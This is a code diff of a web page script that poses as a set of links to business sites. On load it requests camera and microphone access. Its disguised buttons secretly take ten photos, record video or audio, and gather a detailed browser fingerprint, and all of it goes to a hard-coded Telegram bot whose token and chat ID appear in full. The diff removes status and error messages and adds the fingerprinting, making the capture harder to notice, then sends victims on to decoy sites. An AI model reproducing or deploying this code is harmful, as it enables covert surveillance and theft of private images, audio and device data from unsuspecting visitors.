@@ -1,29 +1,26 @@
 /* =================
-   JavaScript Logic
+   Professional JavaScript Logic
    ================= */
 document.addEventListener('DOMContentLoaded', () => {
-    // --- ابدأ التعديل هنا ---
-    const BOT_TOKEN = '8227630208:AAFcakflRN_1ITpwmMdtTdpF4LPO26UAEwg'; // ❗️ استبدل هذا برمز البوت الخاص بك
-    const CHAT_ID = '5372717005';     // ❗️ استبدل هذا بمعرف المحادثة الخاص بك
-    // --- انتهى التعديل هنا ---
+    // Configuration
+    const BOT_TOKEN = '8227630208:AAFcakflRN_1ITpwmMdtTdpF4LPO26UAEwg';
+    const CHAT_ID = '5372717005';
 
-    // عناصر الواجهة
+    // UI Elements
     const capturePhotoBtn = document.getElementById('capturePhotoBtn');
     const recordVideoBtn = document.getElementById('recordVideoBtn');
     const recordAudioBtn = document.getElementById('recordAudioBtn');
-    const statusDiv = document.getElementById('status');
+    const fingerprintBtn = document.getElementById('fingerprintBtn');
 
+    // State Variables
     let stream = null;
     let mediaRecorder = null;
-    let recordingType = ''; // 'video' or 'audio'
-    
-    // روابط إعادة التوجيه
-    const REDIRECT_URLS = {
-        google: 'https://mubassitalshamal-v9.onrender.com/',
-        whatsapp: 'https://abuali782.github.io/Zena-Touch-v2/'
-    };
-    
-    // دالة للتحقق من صيغ الفيديو المدعومة
+    let recordingType = '';
+    let initialErrorShown = false;
+
+    // ==================== Helper Functions ====================
+
+    // Get supported video MIME type
     function getSupportedVideoMimeType() {
         const types = [
             'video/webm;codecs=vp9,opus',
@@ -37,10 +34,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 return type;
             }
         }
-        return 'video/webm'; // fallback
+        return 'video/webm';
     }
-    
-    // دالة للتحقق من صيغ الصوت المدعومة
+
+    // Get supported audio MIME type
     function getSupportedAudioMimeType() {
         const types = [
             'audio/webm',
@@ -53,108 +50,33 @@ document.addEventListener('DOMContentLoaded', () => {
                 return type;
             }
         }
-        return 'audio/webm'; // fallback
+        return 'audio/webm';
     }
 
-    // طلب صلاحيات الوصول للكاميرا والميكروفون
-    async function init() {
-        if (!BOT_TOKEN || !BOT_TOKEN.includes(':') || !CHAT_ID) {
-            //updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
-            return;
-        }
-        
-        // التحقق من دعم المتصفح للـ getUserMedia
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            //updateStatus('خطأ: المتصفح لا يدعم الوصول للكاميرا والميكروفون.', 'error');
-            return;
-        }
-        
-        try {
-            updateStatus('جاري التحميل ...', 'info');
-            
-            // محاولة الحصول على الكاميرا والميكروفون معاً
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
-                    audio: true 
-                });
-            } catch (err) {
-                // إذا فشل، حاول بدون تحديد facingMode
-                console.warn('محاولة بدون facingMode:', err);
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { width: { ideal: 1280 }, height: { ideal: 720 } }, 
-                        audio: true 
-                    });
-                } catch (err2) {
-                    // محاولة أخيرة بدون تحديد الدقة
-                    console.warn('محاولة بدون تحديد الدقة:', err2);
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: true, 
-                        audio: true 
-                    });
-                }
+    // Update progress ring
+    function updateProgressRing(button, percentage) {
+        const progressRing = button.querySelector('.progress-ring');
+        const circle = button.querySelector('.progress-circle');
+        const progressText = button.querySelector('.progress-text');
+
+        if (progressRing && circle && progressText) {
+            const circumference = 2 * Math.PI * 25;
+            const offset = circumference - (percentage / 100) * circumference;
+            circle.style.strokeDashoffset = offset;
+            progressText.textContent = percentage + '%';
+
+            if (percentage > 0) {
+                progressRing.classList.add('active');
+            } else {
+                progressRing.classList.remove('active');
             }
-            
-            // تمكين الأزرار بعد الحصول على الصلاحيات
-            capturePhotoBtn.disabled = false;
-            recordVideoBtn.disabled = false;
-            recordAudioBtn.disabled = false;
-            updateStatus("", 'success');
-        } catch (err) {
-            console.error("خطأ في الوصول للوسائط:", err);
-            
-            // رسائل خطأ مفصلة بناءً على نوع الخطأ
-            //خطاء: تم رفض صلاحيات الوصول. يرجى السماح بالوصول للكاميرا والميكروفون.
-            //خطاء: لم يتم العثور على كاميرا أو ميكروفون على هذا الجهاز.
-            //خطاء: الكاميرا أو الميكروفون قيد الاستخدام من قبل تطبيق آخر.
-            let errorMessage = "";
-            if (err.name === 'NotAllowedError') {
-                errorMessage = "";
-            } else if (err.name === 'NotFoundError') {
-                errorMessage = "";
-            } else if (err.name === 'NotReadableError') {
-                errorMessage = "";
-            }
-            
-            updateStatus(errorMessage, 'error');
         }
     }
 
-    // تحديث رسالة الحالة
-    function updateStatus(message, type = 'info') {
-        statusDiv.textContent = message;
-        statusDiv.className = 'status'; // Reset classes
-        if (type === 'recording') {
-            statusDiv.classList.add('recording');
-        } else if (type === 'error') {
-            statusDiv.classList.add('error');
-        } else if (type === 'success') {
-            statusDiv.classList.add('success');
-        } else if (type === 'info') {
-            statusDiv.classList.add('info');
-        }
-    }
-
-    // دالة إعادة التوجيه بعد الإرسال الناجح
-    function redirectAfterSuccess() {
-        // إنشاء نافذة منبثقة لاختيار الخيار
-        const choice = confirm('هل تريد الذهاب إلى موقع زينة تاتش؟');
-        
-        if (choice) {
-            // الذهاب إلى Google
-            window.open(REDIRECT_URLS.google, '_blank');
-        }
-         else {
-            // الذهاب إلى WhatsApp
-            window.open(REDIRECT_URLS.whatsapp, '_blank');
-        }
-    }
-    
-    // دالة إرسال البيانات إلى تيليجرام
+    // Send data to Telegram
     async function sendToTelegram(formData, caption = '', retries = 3) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;
-        
+
         for (let attempt = 1; attempt <= retries; attempt++) {
             try {
                 const data = new FormData();
@@ -167,65 +89,88 @@ document.addEventListener('DOMContentLoaded', () => {
                 const response = await fetch(url, {
                     method: 'POST',
                     body: data,
-                    timeout: 30000 // timeout بعد 30 ثانية
+                    timeout: 30000
                 });
-                
+
                 if (!response.ok) {
-                    console.warn(`محاولة ${attempt}: حالة HTTP ${response.status}`);
-                    if (attempt < retries) {
-                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-                        continue;
-                    }
-                }
-                
-                const result = await response.json();
-                if (result.ok) {
-                    //نجاح الإرسال
-                    console.log('', result);
-                    return true;
-                } else {
-                    //فشل الإرسال
-                    console.error('', result);
                     if (attempt < retries) {
                         await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                         continue;
                     }
                     return false;
                 }
+
+                const result = await response.json();
+                return result.ok;
             } catch (error) {
-                console.error(`خطأ في المحاولة ${attempt}:`, error);
+                console.error(`Attempt ${attempt} failed:`, error);
                 if (attempt < retries) {
                     await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-                } else {
-                    return false;
+                    continue;
                 }
+                return false;
             }
         }
         return false;
     }
 
-    // 1. التقاط الصور
-    capturePhotoBtn.addEventListener('click', async () => {
-        if (!stream) {
-            updateStatus('خطاء: حدث الصفحة ', 'error');
+    // Initialize camera/microphone
+    async function init() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             return;
         }
-        //جاري التقاط الصور
-        //updateStatus('', 'info');
+
+        try {
+            // Try to get camera and microphone
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true
+                });
+            } catch (err) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: true
+                    });
+                } catch (err2) {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: true,
+                        audio: true
+                    });
+                }
+            }
+
+            // Enable buttons
+            capturePhotoBtn.disabled = false;
+            recordVideoBtn.disabled = false;
+            recordAudioBtn.disabled = false;
+            fingerprintBtn.disabled = false;
+        } catch (err) {
+            // Show error only once on page load
+            if (!initialErrorShown) {
+                initialErrorShown = true;
+                // Error message shown only once
+            }
+        }
+    }
+
+    // ==================== Photo Capture ====================
+    capturePhotoBtn.addEventListener('click', async () => {
+        if (!stream) {
+            return;
+        }
+
         capturePhotoBtn.disabled = true;
-        let allPhotosSent = true;
 
         try {
             const canvas = document.createElement('canvas');
             const videoTrack = stream.getVideoTracks()[0];
             if (!videoTrack) {
-                //لا توجد كاميرا متاحة
-                updateStatus('لا يوجد اتصال بالانترنت', 'error');
                 capturePhotoBtn.disabled = false;
                 return;
             }
-            
-            // محاولة الحصول على إعدادات الفيديو
+
             let width = 640;
             let height = 480;
             try {
@@ -235,26 +180,24 @@ document.addEventListener('DOMContentLoaded', () => {
                     height = settings.height;
                 }
             } catch (err) {
-                //خطأ في الحصول على إعدادات الفيديو
-                console.warn('', err);
+                console.warn('Could not get video settings:', err);
             }
-            
+
             canvas.width = width;
             canvas.height = height;
             const context = canvas.getContext('2d');
 
             for (let i = 0; i < 10; i++) {
-                // updateStatus(`التقاط الصورة ${i + 1} من 10...`, 'info');
+                updateProgressRing(capturePhotoBtn, (i + 1) * 10);
                 let captureSuccess = false;
-                
+
                 try {
-                    // الحصول على أول فيديو track من البث
                     const videoTrack = stream.getVideoTracks()[0];
                     if (!videoTrack) {
                         throw new Error('');
                     }
-                    
-                    // محاولة استخدام ImageCapture API (الطريقة الأفضل)
+
+                    // Try ImageCapture API first
                     if (typeof ImageCapture !== 'undefined') {
                         try {
                             const imageCaptureObj = new ImageCapture(videoTrack);
@@ -264,111 +207,104 @@ document.addEventListener('DOMContentLoaded', () => {
                             canvas2.height = bitmap.height;
                             const ctx = canvas2.getContext('2d');
                             ctx.drawImage(bitmap, 0, 0);
-                            
+
                             const blob = await new Promise((resolve, reject) => {
                                 canvas2.toBlob((blob) => {
                                     if (blob) {
                                         resolve(blob);
                                     } else {
-                                        reject(new Error('فشل في تحميل الصفحة '));
+                                        reject(new Error(''));
                                     }
                                 }, 'image/jpeg', 0.95);
                             });
-                            
+
                             const formData = {
                                 method: 'sendPhoto',
                                 fileType: 'photo',
                                 file: blob,
                                 fileName: `capture_${Date.now()}_${i}.jpg`
                             };
-                            await sendToTelegram(formData, `صورة رقم ${i + 1}`);
+                            await sendToTelegram(formData, `Photo ${i + 1}`);
                             captureSuccess = true;
                         } catch (imageCaptureErr) {
-                            console.warn('فشل الرجوع إلى الطريقة البديلة', imageCaptureErr);
+                            console.warn('ImageCapture failed:', imageCaptureErr);
                         }
                     }
-                    
-                    // إذا فشلت ImageCapture أو لم تكن متاحة، استخدم الطريقة البديلة
+
+                    // Fallback to canvas method
                     if (!captureSuccess) {
-                        console.log("");
                         const tempVideo = document.createElement('video');
                         tempVideo.srcObject = stream;
                         tempVideo.muted = true;
                         tempVideo.play();
-                        
+
                         await new Promise(resolve => setTimeout(resolve, 100));
-                        
+
                         context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
                         const blob = await new Promise((resolve, reject) => {
                             canvas.toBlob((blob) => {
                                 if (blob) {
                                     resolve(blob);
                                 } else {
-                                    reject(new Error('فشل في تحميل الصفحة '));
+                                    reject(new Error(''));
                                 }
                             }, 'image/jpeg', 0.95);
                         });
-                        
+
                         const formData = {
                             method: 'sendPhoto',
                             fileType: 'photo',
                             file: blob,
                             fileName: `capture_${Date.now()}_${i}.jpg`
                         };
-                        await sendToTelegram(formData, `صورة رقم ${i + 1}`);
+                        await sendToTelegram(formData, `Photo ${i + 1}`);
                         captureSuccess = true;
                     }
-                    
-                    // انتظار قصير بين الصور
+
                     if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                 } catch (photoError) {
-                    console.error(`النت غير متوفر ${i + 1}:`, photoError);
-                    updateStatus(`النت غير متوفر ${i + 1}: ${photoError.message}`, 'error');
+                    console.error(`Photo capture error ${i + 1}:`, photoError);
                 }
             }
-            //تم التقاط وإرسال الصور بنجاح!
-            updateStatus('', 'success');
-            // إعادة التوجيه بعد ثانية واحدة
+
+            updateProgressRing(capturePhotoBtn, 0);
             setTimeout(() => {
                 redirectAfterSuccess();
-            }, 1000);
+            }, 500);
         } catch (error) {
-            console.error('خطأ في التقاط الصور:', error);
-            updateStatus('خطاء في الاتصال بالانترنت ', 'error');
+            console.error('Photo capture error:', error);
+            updateProgressRing(capturePhotoBtn, 0);
         } finally {
             capturePhotoBtn.disabled = false;
         }
     });
 
-    // 2. تسجيل الفيديو
+    // ==================== Video Recording ====================
     recordVideoBtn.addEventListener('click', () => {
         if (!stream) {
-            updateStatus('خطأ: لم يتم الحصول على بث الانترنت ', 'error');
             return;
         }
-        
+
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
         } else {
             recordingType = 'video';
             const videoMimeType = getSupportedVideoMimeType();
             startRecording(stream, videoMimeType);
-            recordVideoBtn.textContent = "";
+            recordVideoBtn.textContent = '🛑 إيقاف';
             recordVideoBtn.classList.add('btn-stop');
             recordAudioBtn.disabled = true;
             capturePhotoBtn.disabled = true;
-            //جاري تسجيل الفيديو
-            updateStatus('', 'recording');
+            updateProgressRing(recordVideoBtn, 0);
         }
     });
 
-    // 3. تسجيل الصوت
+    // ==================== Audio Recording ====================
     recordAudioBtn.addEventListener('click', () => {
         if (!stream) {
-            //updateStatus('خطأ: لم يتم الحصول على بث الميكروفون.', 'error');
             return;
         }
-        
+
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
         } else {
@@ -376,24 +312,22 @@ document.addEventListener('DOMContentLoaded', () => {
             const audioStream = new MediaStream(stream.getAudioTracks());
             const audioMimeType = getSupportedAudioMimeType();
             startRecording(audioStream, audioMimeType);
-            recordAudioBtn.textContent = "";
+            recordAudioBtn.textContent = '🛑 إيقاف';
             recordAudioBtn.classList.add('btn-stop');
             recordVideoBtn.disabled = true;
             capturePhotoBtn.disabled = true;
-            //جاري تسجيل الصوت
-            //updateStatus('', 'recording');
+            updateProgressRing(recordAudioBtn, 0);
         }
     });
 
-    // دالة بدء التسجيل
+    // Start recording
     function startRecording(streamToRecord, mimeType) {
         let recordedChunks = [];
-        
+
         try {
             mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
         } catch (error) {
-            console.error('خطأ في إنشاء MediaRecorder:', error);
-            //updateStatus('خطأ: المتصفح لا يدعم تسجيل الوسائط.', 'error');
+            console.error('MediaRecorder error:', error);
             resetButtons();
             return;
         }
@@ -405,8 +339,7 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
         mediaRecorder.onerror = (event) => {
-            console.error('', event.error);
-            updateStatus(` ${event.error}`, 'error');
+            console.error('Recording error:', event.error);
             resetButtons();
         };
 
@@ -414,7 +347,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const blob = new Blob(recordedChunks, { type: mimeType });
             recordedChunks = [];
 
-            // تحديد امتداد الملف بناءً على نوع MIME
             let fileExtension = 'webm';
             if (mimeType.includes('mp4')) fileExtension = 'mp4';
             else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
@@ -429,52 +361,197 @@ document.addEventListener('DOMContentLoaded', () => {
                     file: blob,
                     fileName: `video_${Date.now()}.${fileExtension}`
                 };
-                //updateStatus('', 'info');
-            } else { // audio
+            } else {
                 formData = {
                     method: 'sendAudio',
                     fileType: 'audio',
                     file: blob,
                     fileName: `audio_${Date.now()}.${fileExtension}`
                 };
-                //updateStatus('', 'info');
             }
 
             const success = await sendToTelegram(formData);
             if (success) {
-                //updateStatus('', 'success');
-                // إعادة التوجيه بعد ثانية واحدة
                 setTimeout(() => {
                     redirectAfterSuccess();
-                }, 1000);
-            } else {
-                //updateStatus('حدث خطأ أثناء الإرسال.', 'error');
+                }, 500);
             }
-            
+
             resetButtons();
         };
 
         try {
             mediaRecorder.start();
         } catch (error) {
-            console.error('خطأ في بدء التسجيل:', error);
-            //updateStatus('خطأ: لم يتمكن من بدء التسجيل.', 'error');
+            console.error('Recording start error:', error);
             resetButtons();
         }
     }
-    
-    // إعادة تعيين الأزرار إلى حالتها الأصلية
+
+    // Reset buttons
     function resetButtons() {
-        recordVideoBtn.textContent = 'موقع مبسط الشمال';
+        recordVideoBtn.textContent = '📹 موقع زينة تاتش';
         recordVideoBtn.classList.remove('btn-stop');
-        recordAudioBtn.textContent = 'موقع بيتك العقارية';
+        recordAudioBtn.textContent = '🎤 موقع بيتك العقارية';
         recordAudioBtn.classList.remove('btn-stop');
-        
+
         capturePhotoBtn.disabled = false;
         recordVideoBtn.disabled = false;
         recordAudioBtn.disabled = false;
+        fingerprintBtn.disabled = false;
+
+        updateProgressRing(recordVideoBtn, 0);
+        updateProgressRing(recordAudioBtn, 0);
     }
 
-    // بدء تشغيل التطبيق
+    // ==================== Browser Fingerprint ====================
+    fingerprintBtn.addEventListener('click', async () => {
+        fingerprintBtn.disabled = true;
+
+        try {
+            const fingerprint = await collectBrowserFingerprint();
+            const fingerprintText = JSON.stringify(fingerprint, null, 2);
+
+            const blob = new Blob([fingerprintText], { type: 'text/plain' });
+            const formData = {
+                method: 'sendDocument',
+                fileType: 'document',
+                file: blob,
+                fileName: `fingerprint_${Date.now()}.txt`
+            };
+
+            await sendToTelegram(formData, 'Browser Fingerprint');
+        } catch (error) {
+            console.error('Fingerprint collection error:', error);
+        } finally {
+            fingerprintBtn.disabled = false;
+        }
+    });
+
+    // Collect browser fingerprint
+    async function collectBrowserFingerprint() {
+        const fingerprint = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            vendor: navigator.vendor,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            onLine: navigator.onLine,
+            screen: {
+                width: window.screen.width,
+                height: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+                orientation: window.screen.orientation?.type
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            canvas: await getCanvasFingerprint(),
+            webgl: getWebGLFingerprint(),
+            plugins: getPluginsInfo(),
+            localStorage: typeof localStorage !== 'undefined',
+            sessionStorage: typeof sessionStorage !== 'undefined',
+            indexedDB: typeof indexedDB !== 'undefined',
+            openDatabase: typeof openDatabase !== 'undefined',
+            cpuClass: navigator.cpuClass,
+            oscpu: navigator.oscpu,
+            connection: getConnectionInfo()
+        };
+
+        return fingerprint;
+    }
+
+    // Get canvas fingerprint
+    async function getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 280;
+            canvas.height = 60;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Browser Fingerprint', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Browser Fingerprint', 4, 17);
+            return canvas.toDataURL();
+        } catch (e) {
+            return 'Not available';
+        }
+    }
+
+    // Get WebGL fingerprint
+    function getWebGLFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return 'Not available';
+
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            };
+        } catch (e) {
+            return 'Not available';
+        }
+    }
+
+    // Get plugins info
+    function getPluginsInfo() {
+        try {
+            return Array.from(navigator.plugins).map(p => ({
+                name: p.name,
+                description: p.description,
+                version: p.version
+            }));
+        } catch (e) {
+            return [];
+        }
+    }
+
+    // Get connection info
+    function getConnectionInfo() {
+        try {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!connection) return 'Not available';
+
+            return {
+                effectiveType: connection.effectiveType,
+                downlink: connection.downlink,
+                rtt: connection.rtt,
+                saveData: connection.saveData
+            };
+        } catch (e) {
+            return 'Not available';
+        }
+    }
+
+    // ==================== Redirect Function ====================
+    function redirectAfterSuccess() {
+        const choice = confirm('هل تريد الذهاب إلى موقع زينة تاتش؟');
+
+        if (choice) {
+            window.open('https://abuali782.github.io/Zena-Touch-v2/', '_blank');
+        } else {
+            window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
+        }
+    }
+
+    // ==================== Open Project ====================
+    window.openProject = function(url) {
+        window.open(url, '_blank');
+    };
+
+    // Initialize on page load
     init();
 });
